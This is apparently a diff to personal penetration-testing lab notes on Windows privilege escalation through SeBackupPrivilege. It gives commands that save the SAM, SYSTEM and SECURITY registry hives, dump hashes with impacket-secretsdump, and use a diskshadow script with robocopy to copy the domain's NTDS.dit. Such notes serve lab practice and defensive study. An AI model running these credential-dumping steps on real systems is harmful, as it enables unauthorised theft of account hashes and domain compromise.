@@ -79,18 +79,27 @@ Add a new entry in **/etc/hosts** to point `resourcedc.resourced.local` to the t
 https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
 
 #### Example 1 -- reg save
+Use this for local accounts
+
 `mkdir c:\temp`
-`reg save hklm\sam c:\temp\sam
-`reg save hklm\system c:\temp\system
+```powershell
+reg save hklm\sam c:\temp\sam
+reg save hklm\system c:\temp\system
+reg save hklm\security c:\temp\security
+```
 
 then transfer back
 
 Dump creds with impacket secretsdump
 `impacket-secretsdump -system system -sam sam local
 
+
 #### Example 2 -- diskshadow
-Create txt script
-```
+This may be used for domain accounts as well as local
+
+Create script.txt
+```bash
+# script.txt contents
 set verbose on
 set metadata C:\Windows\Temp\meta.cab
 set context clientaccessible
@@ -102,19 +111,19 @@ expose %cdrive% E:
 end backup
 ```
 
+Covert to Windows newlines
+```bash
+unix2dos script.txt
+```
+
 Run diskshadow
 ```
 diskshadow /s script.txt
 ```
 
-Switch to E: Drive
-```
-E:
-```
-
 Copy NTDS.dit file using Robocopy to the temp file in C:
-```
-robocopy /b E:\Windows\ntds . ntds.dit
+```powershell
+C:\> robocopy /b E:\Windows\ntds . ntds.dit
 ```
 
 copy system hive
